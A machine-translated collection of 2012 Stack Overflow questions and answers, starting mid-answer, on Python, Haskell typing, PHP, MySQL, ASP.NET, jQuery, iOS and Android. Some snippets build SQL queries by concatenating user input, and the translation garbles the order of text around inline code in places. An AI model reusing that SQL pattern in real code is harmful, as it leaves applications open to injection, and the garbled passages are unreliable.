l2 = raw_input('> ') # Ideally, you should verify that the user entered a valid path (eg: are '/' allowed at the end of a path?)

while l2 != '//':
    l1.append(l2)
    l2 = raw_input('> ')

print "Your paths are: "
for path in l1:
    print path

# I am not sure what you are trying to achieve with "print l1[1].count("/")" so leaving it out

# I would suggest to print the options outside the loop, it's a matter of taste, 
# but do you really want to keep printing them out?
print "Choose an option: \n\
       1\. Number of subfolders of path\n\
       2\. Number of folders at a specific path\n\
       3\. Max depth between all folders\n\
       4\. Quit\n"

choice = raw_input('Enter choice: ')

while choice!='4':
    if choice == '1':
        path = raw_input('Which path are you looking for?')
            # Calculate and print the output here

    # This is the question you asked, so I am answering how to process this step    
    if choice == '2':
        level = raw_input('Which level? ') # Ideally, you should verify that the user indeed enters an int here

        # Since your python does not seem to be very advanced, let's use a simple for loop:
        num=0
        for path in l1:
            if str.count(path, '/')==int(level):
                num = num+1

        print 'Number of such paths is: ', num

    if choice == '3':
        print 'this is not yet implemented'
        # Do something

    choice = raw_input('Enter choice: ') 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T14:00:10.573

使用[`str.count(substring)`](http://docs.python.org/library/stdtypes.html#str.count)，它计算一个序列在字符串中出现的次数。

```
paths = [
    '/home/user/music',
    '/home/user/photos',
    '/home/user/research',
    '/home/user/music/rock'
]

level = 3

wantedPaths = [path for path in paths if path.count('/') == level]
print wantedPaths 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T14:20:41.277

这应该可以帮助您：

```
strings = [
    '/home/user/music',
    '/home/user/photos',
    '/home/user/research',
    '/home/user/music/rock',
]

def slash_counter(n):
    return lambda x: x.count('/') == n

n = int(raw_input('Gimme n: '))

for path in filter(slash_counter(n), strings):
    print path 
```

# asp.net - 如何从asp.net中的数据库中检索纬度和经度

> ID：10772119
> 
> 赞同：0
> 
> 时间：2012-05-27T06:33:39.673
> 
> 标签：asp.net, sql-server-2008

我有一个应用程序，当在树视图中选择相应的位置并且该位置必须显示在谷歌地图上时，我必须从本地数据库中检索纬度和经度，在后面的代码中我有树视图数据库连接的代码和谷歌地图的代码是在javascript中...

现在我将如何做到这一点......？

请帮助我解决这个问题或提供有用的链接....

谢谢...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T07:11:30.397

我认为[Google Maps API 示例](https://developers.google.com/maps/documentation/javascript/v2/examples/)+ [15 个有用的 jQuery Google Maps 插件、教程和资源](http://www.tripwiremagazine.com/2011/06/query-google-maps.html)一定对您有所帮助。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-05-28T06:11:18.723

最后我得到了我的问题的解决方案......我只是通过渲染脚本并使用RegisterStartupScript（）从treenode更改事件处理程序中调用了加载映射函数（用javascript编写）......最终代码看起来像这样 ：

```
 protected void TreeView1_SelectedNodeChanged2(object sender, EventArgs e)
    {
        string conn = @"Data Source=RESHMA-PC\SQLEXPRESS;Initial Catalog=reshma;Integrated Security=True";
        string str = "select Lat,Lng from ChildTable where ChildName='"+TreeView1.SelectedNode.Text+"';";
        string inv;
        SqlConnection scon = new SqlConnection(conn);
        scon.Open();
        SqlDataAdapter ada = new SqlDataAdapter(str, scon);
        DataSet ds = new DataSet();

        ada.Fill(ds, "ChildTable");
        var lat = ds.Tables[0].Rows[0][0];
        var lang = ds.Tables[0].Rows[0][1];
        inv = "<script type='text/javascript'>loadGmap(" + lat + "," + lang + ");</script>";
        Page.RegisterStartupScript("inv", inv);

    } 
```

# haskell - bi fab 的通用变体 = (fa, fb)

> ID：10772121
> 
> 赞同：13
> 
> 时间：2012-05-27T06:34:06.310
> 
> 标签：haskell, types, higher-rank-types

是否有任何类型安全的方法来编写函数

```
bi f a b = (f a, f b) 
```

这样就可以像这样使用它：

```
x1 :: (Integer, Char)
x1 = bi head [2,3] "45"

x2 :: (Integer, Char)
x2 = bi fst (2,'3') ('4',5)

x3 :: (Integer, Double)
x3 = bi (1+) 2 3.45 
```

? 在 rank-n-types 示例中，总会有一些更简单的东西，例如

```
g :: (forall a. a -> a) -> a -> a -> (a, a)
g f a b = (f a, f b) 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-30T02:41:41.753

```
{-# LANGUAGE TemplateHaskell #-}

bi f = [| \a b -> ($f a, $f b)|] 
```

```
ghci> :set -XTemplateHaskell 
ghci> $(bi [|head|]) [2,3] "45" 
(2,'4') 
```

;)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-30T06:58:05.510

是的，虽然不在 Haskell 中。但是高阶多态 lambda 演算（又名 System F-omega）更通用：

```
bi : forall m n a b. (forall a. m a -> n a) -> m a -> m b -> (n a, n b)
bi {m} {n} {a} {b} f x y = (f {a} x, f {b} y)

x1 : (Integer, Char)
x1 = bi {\a. List a} {\a. a} {Integer} {Char} head [2,3] "45"

x2 : (Integer, Char)
x2 = bi {\a . exists b. (a, b)} {\a. a} {Integer} {Char} (\{a}. \p. unpack<b,x>=p in fst {a} {b} x) (pack<Char, (2,'3')>) (pack<Integer, ('4',5)>)

x3 : (Integer, Double)
x3 = bi {\a. a} {\a. a} {Integer} {Double} (1+) 2 3.45 
```

在这里，我为显式类型应用程序编写`f {T}`并假设一个库分别被键入。类似的东西`\a. a`是类型级别的 lambda。这个`x2`例子更复杂，因为它还需要存在类型来本地“忘记”参数中的另一位多态性。

实际上，您可以在 Haskell 中通过`newtype`为每个不同`m`或`n`您实例化的定义一个或数据类型来模拟这一点，并传递相应地`f`添加和删除构造函数的适当包装的函数。但显然，这根本不好玩。

**编辑**：我应该指出，这仍然不是一个*完全*通用的解决方案。例如，我看不到您如何输入

```
swap (x,y) = (y,x)
x4 = bi swap (3, "hi") (True, 3.1) 
```

即使在 System F-omega 中。问题是该`swap`函数比`bi`允许的多态性更强，并且与 with 不同`x2`，结果中没有忘记其他多态维度，因此存在技巧不起作用。似乎您需要一种多态性来允许该多态性（以便参数`bi`可以在不同数量的类型上是多态的）。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-27T07:33:47.963

即使使用 ConstraintKinds，我认为障碍将是量化从参数到结果的“类型函数”。您*想要*的是`f`映射`a -> b`and`c -> d`和采取`a -> b -> (c, d)`，但我认为没有任何方法可以完全概括地量化这种关系。

但是，一些特殊情况可能是可行的：

```
(forall x . cxt x => x -> f x) -> a -> b -> (f a, f b)
 -- e.g. return

(forall x . cxt x => f x -> x) -> f a -> f b -> (a, b)
 -- e.g. snd
(forall x . cxt x => x -> x) -> a -> b -> (a, b)
 -- e.g. (+1) 
```

但鉴于您正试图量化或多或少的任意类型函数，我不确定您是否可以做到这一点。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-27T20:19:06.710

我认为这与您将要获得的一样接近：

```
{-# LANGUAGE MultiParamTypeClasses, FunctionalDependencies #-}
module Data.Function.Bi (bi, Fn(..))

bi :: (Fn i a a', Fn i b b') => i -> a -> b -> (a', b')
bi i a b = (fn i a, fn i b)

class Fn i x x' | i x -> x' where
      fn :: i -> x -> x' 
```

像这样使用它：

```
{-# LANGUAGE MultiParamTypeClasses, FunctionalDependencies, RankNTypes,
             FlexibleInstances, UndecidableInstances #-}
import Data.Function.Bi

data Snd = Snd

instance Fn Snd (a, b) b where
         fn Snd = snd

myExpr1 :: (Int, String)
myExpr1 = bi Snd (1, 2) ("a", "b")
-- myExpr == (2, "b")

data Plus = Plus (forall a. (Num a) => a)

instance (Num a) => Fn Plus a a where
         fn (Plus n) = (+n)

myExpr2 :: (Int, Double)
myExpr2 = bi (Plus 1) (1, 2) (1.3, 5.7)
-- myExpr2 == (3, 6.7) 
```

它非常笨重，但尽可能通用。

# php - php函数'overload'有什么作用？

> ID：10772122
> 
> 赞同：5
> 
> 时间：2012-05-27T06:34:06.560
> 
> 标签：php, methods

根据 PHP 文档：

> 重载() 函数将为由 class_name 标识的类启用属性和方法调用重载。

[http://www.php.net/manual/en/function.overload.php](http://www.php.net/manual/en/function.overload.php)

但这究竟是什么意思？这是否意味着我可以对该类进行适当的重载（如 Java 的重载）？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-27T06:41:15.387

它基本上启用了[魔术访问器方法](http://php.net/manual/en/language.oop5.magic.php)，例如`__get()`,`__set()`等。

从 PHP5 开始，这不再是必需的并且默认启用。事实上，你不能把它关掉;-)

# php - 如何使用 MySQL 和 PHP 执行多对多插入？

> ID：10772124
> 
> 赞同：0
> 
> 时间：2012-05-27T06:34:37.110
> 
> 标签：php, mysql, insert, many-to-many

我有一个多对多 MySQL 数据库，其中包含三个表 entry、tag 和 entry_tag。
entry table 有 id INT AUTO_INCREMENT PRIMARY KEY，title TEXT 和 entry TEXT 列
tag table 有 id INT AUTO_INCREMENT PRMARY KEY 和 tag VARCHAR(15) 列
entry_tag 是 entry 和 tag 之间的映射表，并且有 entry_id INT 和 tag_id INT，entry_id 和tag_id 创建主键。

现在，我想将 entry.title 和 entry.entry 以及相关的标签 tag.tag 插入到数据库和相应的表中。我还想将适当的映射信息插入 entry_tag 表中。谁能告诉我我该怎么做？我正在使用 PHP。如何获取 entry.id 和 tag.id 并在映射表中将它们链接在一起？

我有：

```
$sql_query = "INSERT INTO entry SET
    title = '$title',
    entry = '$entry'";

if (!mysqli_query($link, $sql_query)) {
    $error = 'Error adding submitted entry.';
    include 'includes/error.html.php';
    exit();
}

$sql_query = "INSERT INTO tag SET
    tag = '$tag'";

if (!mysqli_query($link, $sql_query)) {
    $error = 'Error adding submitted entry.';
    include 'includes/error.html.php';
    exit();
} 
```

现在，我想执行：

```
$sql_query = "INSERT INTO entry_tag SET
    entry_id = '$entry.id',
    tag_id = '$tag.id'"; 
```

但我坚持得到正确的 $entry.id 和 $tag.id。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T07:14:10.327

用于`mysql_insert_id()`捕获最后插入的ID

# javascript - jQuery 可通过溢出排序：隐藏；在两个列表之间

> ID：10772129
> 
> 赞同：4
> 
> 时间：2012-05-27T06:35:18.770
> 
> 标签：javascript, jquery, html, css

我有两个列表，其中使用 jQuery sortable 我可以在它们之间移动项目。

```
$( '#productsList, #orderList' )
.sortable({connectWith: '.containerDiv'})
.disableSelection(); 
```

`overflow:hidden;`但是，当我想使用自定义滚动条并在两个列表上进行设置时，我遇到了问题。我希望他们在一起`max-height:400px`。如果我设置溢出隐藏，我在将它们拖到一个 div 之外后看不到这些项目，如果我没有设置隐藏，列表将具有默认滚动条。任何人都可以提出解决方案。

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-27T14:04:22.967

如果您`position:relative`从列表中删除样式似乎可以按您的意愿工作。

[http://jsfiddle.net/cCDcQ/2/](http://jsfiddle.net/cCDcQ/2/)

**编辑：**

我原以为使用 appendTo 选项可以解决这个问题，我是对的。经过一番摆弄，我得到了它的工作。这样，您可以在`position:relative`需要时保留它。

[http://jsfiddle.net/cCDcQ/4/](http://jsfiddle.net/cCDcQ/4/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-02-16T15:27:47.683

我知道这张票有点过时了，但是我在使用自定义滚动条解决方案并尝试在隐藏溢出的情况下在 Sortable 之间拖动时遇到了同样的问题。在添加代码以修复 Sortable 以使用我的 Scrollpane 后，我注意到 appendTo 功能似乎有遗漏。

*appendTo*的代码仅在 DOM 中不存在帮助器时将其附加到目标。这就是为什么克隆选项适用于某些人（但不适用于所有人，我不会在这里讨论）。修复它的关键是将此代码添加到小部件的*_mouseStart*函数的末尾：

```
if (!this.helper.parent().is(this.appendTo)) {
    this.helper.detach().appendTo(this.appendTo);
    // update position
    this.offset.parent = this._getParentOffset();
} 
```

注意*this.appendTo*是在函数的前面设置的：

```
this.appendTo = $( o.appendTo !== "parent" ?
        o.appendTo :
        this.currentItem.parent() ); 
```

With this fix in place, I specified an *appendTo* that targeted the div that contained both Sortable's and ceased to have the overflow issue.

The complete fix-up, including other flow fixes, is available in the scrollsortable JS file for the jQuery-UI-ScrollPane available here: [https://github.com/borgboyone/jQuery-UI-ScrollPane](https://github.com/borgboyone/jQuery-UI-ScrollPane).

Cheers!

# objective-c - 截图一个单独的 UIView（不是 self.view）

> ID：10772131
> 
> 赞同：0
> 
> 时间：2012-05-27T06:35:31.753
> 
> 标签：objective-c, ios, xcode, uiview

基本上我想截屏一个名为 CustomViewLayout 的 UIView，它属于 MyClass。MyClass 的视图被分配给 NormalView。因此，如果我调用`self.view`它将引用 NormalView。我创建了一个属性`viewCustom`，它是 CustomViewLayout 的一个出口。无论如何，我想截图CustomViewLayout，我试过这个：

```
UIGraphicsBeginImageContextWithOptions(self.viewCustom.bounds.size, self.viewCustom.opaque, 0.0);

[self.viewCustom.layer renderInContext:UIGraphicsGetCurrentContext()];

UIImage * img = UIGraphicsGetImageFromCurrentImageContext();

UIGraphicsEndImageContext();

return img; 
```

然后该图像会显示/附加在应用内邮件 ( `MFMailComposeViewController`) 中。而且它不起作用，它显示一个带有问号的蓝色框，我认为这意味着图像不可读。我知道我的应用内邮件图片附件代码没有任何问题，因为如果我将屏幕截图代码更改为`self.view`如下截图：

```
UIGraphicsBeginImageContextWithOptions(self.viewCustom.bounds.size, self.viewCustom.opaque, 0.0);

[self.viewCustom.layer renderInContext:UIGraphicsGetCurrentContext()];

UIImage * img = UIGraphicsGetImageFromCurrentImageContext();

UIGraphicsEndImageContext();

return img; 
```

然后它工作正常。那么我应该怎么做才能截取我的另一个视图呢？谢谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T07:27:32.210

解决方案很容易从 MyClass 加载不同的 nib 名称，然后稍后重新加载。简单的！

# python - 何时将代码拆分为文件/模块？

> ID：10772132
> 
> 赞同：8
> 
> 时间：2012-05-27T06:35:54.200
> 
> 标签：python, file, module, project

迄今为止，我一直只开发小型 Python 脚本。它们每个不超过 500 行。现在我要写一些更大的东西——我想它会有大约 1000 行。在一个文件中处理它是个好主意，还是在子目录中组织代码的好时机？我找到了一些关于如何模块化代码的建议，但我找不到任何关于何时执行此操作的信息（或者更确切地说，何时不浪费时间）。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-27T07:00:16.027

我通常在以下情况下这样做：

*   您可以自己运行应用程序的某些部分，并且运行它们会很有用（因此它们可以被重用）
*   应用程序的一部分是抽象的，其余的是具体的（抽象部分可以重用）
*   我想把它分成“插件”
*   单个脚本会变得非常大（然后我按类划分或将单元测试放入单独的文件中）。

一般来说，我会尝试实现可重用性。如果我不能将它分成可重复使用的部分，我不会分割，除非它会变得太大。

# haskell - 在签名中约束构造函数

> ID：10772138
> 
> 赞同：5
> 
> 时间：2012-05-27T06:37:03.607
> 
> 标签：haskell

所以，我正在做一个有趣的语境意义实验，但我碰壁了。我正在尝试定义一种数据类型，它可以是原始数据类型，也可以是从一个构造函数转换为另一个构造函数的函数。

```
data WeaponPart =
    WInt Int |
    WHash (Map.Map String Int) |
    WNull |
    WTrans (WeaponPart -> WeaponPart)

instance Show WeaponPart where
    show (WInt x) = "WInt " ++ (show x)
    show (WHash x) = "WHash " ++ (show x)
    show (WTrans _) = "WTrans"
    show WNull = "WNull"

cold :: WeaponPart -> WeaponPart
cold (WInt x) = WHash (Map.singleton "frost" x)
cold (WHash x) = WHash $ Map.insertWith (+) "frost" 5 x
cold (WTrans x) = cold $ x (WInt 5)
cold (WNull) = cold $ (WInt 5)

ofTheAbyss :: WeaponPart -> WeaponPart
ofTheAbyss (WTrans x) = x (WTrans x) 
```

问题是签名`ofTheAbyss`允许任何 WeaponPart 作为参数，而我只想允许 WTrans 构造的参数。你可以看到我只为这种情况写了一个模式匹配。

我尝试过使用 GADT，但我担心这是一个兔子洞。永远无法真正让他们做我想做的事。有谁知道我如何只将 WTrans 参数强制执行到 ofTheAbyss 中？或者我只是完全错过了一些东西。

谢谢。

最好的，埃里克

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-27T10:07:16.577

你*可以*用 GADT 做这种事情。我根本无法判断结果是否是兔子洞，但至少让我展示一下食谱。我正在使用新的`PolyKinds`扩展，但你可以用更少的东西来管理。

首先，决定你需要什么样的东西，并定义这些类型的数据类型。

```
data Sort = Base | Compound 
```

接下来，定义按其排序索引的数据。这就像构建一个小类型的语言。

```
data WeaponPart :: Sort -> * where
  WInt    :: Int ->                                   WeaponPart Base
  WHash   :: Map.Map String Int ->                    WeaponPart Base
  WNull   ::                                          WeaponPart Base
  WTrans  :: (Some WeaponPart -> Some WeaponPart) ->  WeaponPart Compound 
```

您可以通过存在量化表示“任何类型的数据”，如下所示：

```
data Some p where
  Wit :: p x -> Some p 
```

请注意，`x`不会逃脱，但我们仍然可以检查`x`'satisfies' 的 'evidence' `p`。请注意，它`Some`必须是一个`data`类型，而不是`newtype`作为 GHC 对象的存在性`newtype`s。

您现在可以自由地编写`Sort`-generic 操作。如果您有通用输入，则可以只使用多态性，有效地柯里`Some p -> ...`化为`forall x. p x -> ...`.

```
instance Show (WeaponPart x) where
  show (WInt x)    = "WInt " ++ (show x)
  show (WHash x)   = "WHash " ++ (show x)
  show (WTrans _)  = "WTrans"
  show WNull       = "WNull" 
```

-generic 输出需要存在性`Sort`：这里我将它用于输入和输出。

```
cold :: Some WeaponPart -> Some WeaponPart
cold (Wit (WInt x))    = Wit (WHash (Map.singleton "frost" x))
cold (Wit (WHash x))   = Wit (WHash $ Map.insertWith (+) "frost" 5 x)
cold (Wit (WTrans x))  = cold $ x (Wit (WInt 5))
cold (Wit WNull)       = cold $ Wit (WInt 5) 
```

我不得不偶尔补充`Wit`一下这个地方，但它是同一个程序。

同时，我们现在可以写

```
ofTheAbyss :: WeaponPart Compound -> Some WeaponPart
ofTheAbyss (WTrans x) = x (Wit (WTrans x)) 
```

因此，使用嵌入式类型系统并不可怕。有时是有代价的：如果你想让你的嵌入式语言有*subsorting*，你可能会发现你做额外的计算只是为了改变一些数据类型的索引，对数据本身没有影响。如果您不需要子排序，那么额外的纪律通常可以成为真正的朋友。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-27T15:09:58.770

这是另一种可能的解决方案：将数据类型一分为二。我使用了与其他答案一致的名称，以便于查看相似之处。

```
data WeaponPartBase
    = WInt Int
    | WHash (Map.Map String Int)
    | WNull

data WeaponPartCompound = WTrans (WeaponPart -> WeaponPart)
data WeaponPart = Base WeaponPartBase | Compound WeaponPartCompound

cold :: WeaponPart -> WeaponPart
cold (Base (WInt x)) = Base (WHash (Map.singleton "frost" x))
cold (Base (WHash x)) = Base (WHash $ Map.insertWith (+) "frost" 5 x)
cold (Base WNull) = cold (Base (WInt 5))
cold (Compound (WTrans x)) = cold (x (Base (WInt 5))

ofTheAbyss :: WeaponPartCompound -> WeaponPart
ofTheAbyss (WTrans x) = x (WCompound (WTrans x)) 
```

这可以通过为基本事物声明一个类来稍微方便一些：

```
class Basic a where
    wint :: Int -> a
    whash :: Map.Map String Int -> a
    wnull :: a

class Compounded a where
    wtrans :: (WeaponPart -> WeaponPart) -> a

instance Basic WeaponPartBase where
    wint = WInt
    whash = WHash
    wnull = WNull

instance Basic WeaponPart where
    wint = Base . wint
    whash = Base . whash
    wnull = Base wnull

instance Compounded WeaponPartCompound where
    wtrans = WTrans

instance Compounded WeaponPartCompound where
    wtrans = Compound . wtrans 
```

所以例如`cold`and`ofTheAbyss`可能看起来像这样：

```
cold' (Base (WInt x)) = whash (Map.singleton "frost" x)
cold' (Base (WHash x)) = whash $ Map.insertWith (+) "frost" 5 x
cold' (Base WNull) = cold' (wint 5)
cold' (Compound (WTrans x)) = cold' (x (wint 5))

ofTheAbyss' (WTrans x) = x (wtrans x) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-27T07:15:47.067

您试图不是通过类型而是通过构造函数来约束您的函数。这不是一件可行的事情。

事实上，这不应该是一件可行的事情——如果你正在编写另一个函数，并且你有一些 unknown `WeaponPart`，你必须能够将它传递给`ofTheAbyss`或不传递——这必须进行类型检查。

我能想到的两个选择是：

a) 给出`ofTheAbyss`type `(WeaponPart -> WeaponPart) -> WeaponPart`，“解包”构造函数。

b）`ofTheAbyss`在任何其他构造函数上给出运行时错误。

```
 ofTheAbyss :: WeaponPart -> WeaponPart
 ofTheAbyss (WTrans x) = x (WTrans x)
 ofTheAbyss _ = error "Illegal argument to ofTheAbyss was not a WTrans" 
```

# c# - 如何实现编辑主/明细记录？

> ID：10772139
> 
> 赞同：0
> 
> 时间：2012-05-27T06:37:35.287
> 
> 标签：c#, asp.net, sql-server-2008

我有两张桌子。

```
tbl_Request(PKRequestID, RequestCode) and tbl_Personnel(PKPersonID, PerosnelName FKRequestID) 
```

FKrfequestID 是 tbl_request 的外键。我在 Requests.aspx 页面中有一个显示 tbl_request 记录的网格视图。此页面中也有一个“新项目”按钮。当用户单击此按钮 RequestInsert.aspx 页面打开。在此页面中，用户输入一些数据，如 RequestCode 并点击“下一步”按钮并转到 Personel.aspx 页面，该页面包含一个显示与请求相关的人员的网格视图。在此页面中，用户应定义与请求相关的人员。当整个过程完成时，用户点击“保存”按钮。当用户单击“保存”按钮时，两个表都会更新。如何实现 Personel.aspx 页面？

这是personalaspx.cs代码的代码：

```
protected void Page_Load(object sender, EventArgs e)
{
    if (!IsPostBack)
    {
        DataTable dttbl = new DataTable();
        dttbl.Columns.Add("PKPersonID", System.Type.GetType("System.String"));
        dttbl.Columns.Add("PerosnelName", System.Type.GetType("System.String"));
        dttbl.Columns.Add("FKRequestID", System.Type.GetType("System.String"));
        Session["MyDataTable"] = dttbl;
    }
}
protected void btnok_Click(object sender, EventArgs e)
{
    DataTable t = (DataTable)Session["MyDataTable"]; 
    DataRow row1 = t.NewRow();

    row1["PKPersonID"] = txtid.Text ;
    row1["PerosnelName"] = txtname.Text;
    row1["FKRequestID"] = Session["FKRequestID"];
    t.Rows.Add(row1);

    Session["MyDataTable"] = t;
    GridView1.DataSource = t;
    GridView1.DataBind();
}

protected void btnsave_Click(object sender, EventArgs e)
{
        DataTable t2 = (DataTable)Session["MyDataTable"];
        SqlConnection con = new SqlConnection("connection_string"
        using (SqlCommand command = con.CreateCommand())
        {
            //Here you are inserting values to tbl_Request
            if (con.State == 0)
                con.Open();
            command.CommandText = @"INSERT INTO tbl_Request (PKRequestID,RequestCode) VALUES (@PKRequestID,@RequestCode)";
        command.Parameters.AddWithValue("@PKRequestID", Session["PKRequestID"]);
        command.Parameters.AddWithValue("@RequestCode", Session["RequestCode"]);
        command.ExecuteNonQuery();
    }

    foreach (DataRow row in t2.Rows)
    {
        //Here you are inserting values to tbl_Personnel
        using (SqlCommand command2 = con.CreateCommand())
        {
            if (con.State == 0)
                con.Open();
            command2.CommandText = @"INSERT INTO tbl_Personnel (PerosnelName, FKRequestID) VALUES ( @PerosnelName, @FKRequestID)";
            command2.Parameters.AddWithValue("@PerosnelName", txtname.Text);
            command2.Parameters.AddWithValue("@FKRequestID", Session["PKRequestID"]);
            command2.ExecuteNonQuery();
        }
    }
} 
```

如何实现编辑模式？在这种模式下，我希望用户能够删除或添加人员？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T08:44:03.903

行。您需要使用`session`来存储`tbl_Request.PKRequestID`用户单击时要编辑的记录`Edit button`。之后将用户重定向到一个新页面`Edit_Requests_Personnel.aspx`，您可以在其中编辑记录。

# javascript - 如何用“...”替换大于 50 px 的字符串的一部分？

> ID：10772141
> 
> 赞同：4
> 
> 时间：2012-05-27T06:37:40.970
> 
> 标签：javascript, jquery

我正在寻找一个函数，它用`"..."`. 我想在 Javascript/jQuery 中实现它。

例子：

*   假设我有一个变量`var="Theta Saving Non-Qualified Plan";`，我想限制字符串的长度（基于像素宽度）。如果字符串的长度超过 50px，则字符串中从第 51 个像素到字符串末尾的部分将被替换为`"..."`.

有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T07:47:36.167

不要试图重新发明轮子。使用这样的 Jquery 插件：http: [//tpgblog.com/2009/12/21/threedots-the-jquery-ellipsis-plugin/](http://tpgblog.com/2009/12/21/threedots-the-jquery-ellipsis-plugin/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T10:20:21.157

如果您想截断视觉并且不需要截断实际字符串，这是一个解决方案：

```
<p>
  <span style='width: 50px; height: 1em; 
        overflow: hidden; display: inline-block'>
  This is the long string which should appear truncated followed by elipses
  </span>
  <span>...</span>
</p> 
```

要使其在 IE6 和 7 中工作，我认为您需要添加以下 CSS：

```
zoom: 1
*display: inline; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T06:44:34.243

这不能像您希望的那样简单地推断出来。因为一个字符或一组字符的宽度取决于字体大小。并且计算文本宽度*几乎不准确*。

因此，最好创建对字符而不是宽度友好的界面。

```
var t = $("#div").text();
if(t.length > 50) {
    $("#div").text(t.substr(0,50)+"...");
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-27T10:27:26.220

如果你的文本已经包含在一个宽度为 50px 的块元素中，你可以使用几乎所有浏览器都广泛支持的[text-overflow CSS 规则。](http://caniuse.com/#search=text-overflow)另请参阅[quirksmode 的文本溢出](http://www.quirksmode.org/css/textoverflow.html)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-27T06:55:09.923

我会将字符串拆分为一个数组，然后在一个字母后添加一个字母来测试元素的宽度以知道它是否低于 50px

IE ：

```
var vElement = $('.your_element');

var vStr = vElement.html();

var vShortStr = "";

var vArray = vStr.split("");

for (var i=0; i<vArray.length; i++){

vShortStr += vArray[i];

vElement.html(vShortStr);

if(vElement.width() > 50){

    vShortStr = vShortStr.substring(0, vShortStr.length-1);

    vShortStr += "...";

    vElement.html(vShortStr);

    break;

    }

}
​ 
```

# xcode - 如何安装 dashcode（Apple 开发人员套件的一部分）？

> ID：10772144
> 
> 赞同：4
> 
> 时间：2012-05-27T06:39:34.040
> 
> 标签：xcode, dashcode

我从 App Store 安装了 XCode，但它不包含 Dashcode。我找到了这个（有点过时的）解决方案，它说只需从 Apple Developer Connection 下载 XCode，它包含在该捆绑包中，但我认为我不能/不想这样做，因为我已经安装了 XCode应用商店。

我应该怎么做——除了通过 App Store 卸载 Xcode（它似乎只包含 XCode，不包含 Dashcode），然后从 Developer Connection 下载“大”Xcode 包？

谢谢 E

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-27T06:46:29.827

在 Xcode 中，选择菜单`Xcode > Open Developer Tool > More Developer Tools...`。

![更多开发者工具..."></p> <p>然后下载](../Images/208288c12d35d5846b16779b1c048751.png)

磁盘映像包含 Dashcode 应用程序本身；你可以把它放在你想要的任何地方，并且不需要安装任何包或捆绑包。

[（这在“Xcode 中的新功能”文档](https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/WhatsNewXcode/Articles/xcode_4_3.html#//apple_ref/doc/uid/1006-SW9)中都有解释。）

# java - Android 开发中的持久化数据存储

> ID：10772147
> 
> 赞同：1
> 
> 时间：2012-05-27T06:40:21.970
> 
> 标签：java, android

我是 Java 和 Android 开发的新手，我想问一下将数据存储到持久存储的可用方法是什么？例如，我想将字符串集合存储在数据库或文件中。

请指教。谢谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-27T07:22:35.837

[数据存储](http://developer.android.com/guide/topics/data/data-storage.html)

Android 为您提供了几种保存持久应用程序数据的选项。您选择的解决方案取决于您的特定需求，例如数据是否应该对您的应用程序私有或可供其他应用程序（和用户）访问，以及您的数据需要多少空间。

您的数据存储选项如下：

**Shared Preferences** 将私有原始数据存储在键值对中。

**内部存储** 将私人数据存储在设备内存中。

**外部存储** 将公共数据存储在共享的外部存储上。

**SQLite 数据库** 将结构化数据存储在私有数据库中。网络连接 使用您自己的网络服务器在 Web 上存储数据。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-27T06:51:02.747

正如您在问题本身中所说，您可以使用文件或数据库。如果有更多数据，那么您可以使用文件和数据库（SQLITE），或者如果数据很小，那么您也可以使用 SharedPreferences。下面是一个链接，其中全部关于android中的数据存储全部来自documentaion。希望对您有所帮助。:)

[这](http://developer.android.com/guide/topics/data/data-storage.html)是链接

# orchardcms - Orchard CMS 向页面内容类型添加了额外的 HTML 部分？

> ID：10772148
> 
> 赞同：0
> 
> 时间：2012-05-27T06:40:29.257
> 
> 标签：orchardcms

我正在尝试将我的身体分解为前置内容、内容和发布内容，以便我可以在我的文章中注入广告和其他内容。目前唯一的 HTML 字段模块在 1.4 版本中已损坏，我似乎无法向页面添加额外的正文部分。我必须在正文中创建我的预内容，然后将 HTML 剪切为预内容文本字段。并对帖子内容做同样的事情。必须有更好的方法来做到这一点。有没有办法在页面编辑器中拥有多个 HTML 编辑器字段？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T19:51:43.613

正如我在另一个答案中告诉您的那样，您可以将文本字段配置为使用 HTML。只需添加文本字段，然后在类型编辑器中展开它。有一个下拉菜单，您可以在其中选择 HTML。

# c# - 在 Windows Phone 上的 c# 中将用户输入保存为变量

> ID：10772150
> 
> 赞同：0
> 
> 时间：2012-05-27T06:41:08.140
> 
> 标签：c#, windows-phone-7, windows-phone-7.1

我正在创建一个非常简单的 Windows Phone 应用程序。我正在浏览 msdn 帮助文件并制作它。我想将用户键入的内容作为变量保存到文本框中。怎样才能做到这一点？另外，我怎样才能让用户只能在文本框中输入数字（数值）而不是字母？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-16T12:56:09.000

> text Variable = int.Parse(你的文本也被保存的变量);

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T09:27:14.717

如果你只是用谷歌搜索它，例如“msdn textbox windows phone”，你可以找到很多自己做的事情。

